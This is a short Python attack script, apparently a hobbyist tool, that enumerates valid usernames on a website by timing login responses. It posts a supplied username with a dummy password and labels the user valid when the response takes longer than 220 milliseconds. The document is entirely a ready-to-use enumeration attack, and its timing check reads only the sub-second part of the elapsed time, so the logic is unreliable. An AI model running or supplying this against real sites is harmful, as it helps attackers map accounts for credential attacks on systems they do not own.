### A super simple script to determine valid usernames on a website that you have already determined is vulnerable to timing attacks, just change the IP address and path to login.
### Example- "$python3 Timing.py Admin" will check if "Admin" is a valid username on the host

import requests
import sys

body={"user":sys.argv[1],"password":"anything"} ###the body of the post request
req = requests.post("http://x.x.x.x/path/to/login", data=body) ###the IP and path to login
if req.elapsed.microseconds > 220000:          ###Can be adjusted depending on the website
        print(f"{sys.argv[1]} is a valid User")
else:
        print(f"{sys.argv[1]} is not a valid User")
